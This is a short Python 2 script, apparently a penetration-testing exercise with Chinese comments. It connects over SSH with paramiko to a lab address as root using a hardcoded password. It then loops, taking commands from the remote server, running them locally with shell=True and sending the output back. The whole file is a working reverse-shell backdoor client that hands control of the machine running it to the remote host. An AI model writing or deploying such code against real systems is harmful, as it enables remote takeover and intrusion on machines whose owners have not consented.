#-*- coding:utf8 -*-

import threading
import paramiko
import subprocess

def  ssh_command ( ip , user , passwd , command , port  =  23 ):
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/root/.ssh/known_hosts') #支持用密鑰認證代替密碼驗證,實際環境推薦使用密鑰認證
    
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())     #設置自動添加和保存目標ssh服務器的ssh密鑰
    
    client.connect(ip, port, username = user, password = passwd)   #連接
    
    ssh_session = client.get_transport().open_session() #打開會話
    
    if ssh_session.active:
        ssh_session.exec_command(command)    #執行命令
        print ssh_session.recv( 1024 )     #返回命令執行結果(1024個字符)
        while  True :
            command = ssh_session.recv( 1024 )     #從ssh服務器獲取命令
            try :
                cmd_output = subprocess.check_output(command, shell = True )
                ssh_session.send( str (cmd_output))
            except  Exception , e:
                ssh_session.send( str (e))
        client.close()
    return

ssh_command( '192.168.40.138' , 'root' , 'zzz20255' , 'ClientConnected' , 23 )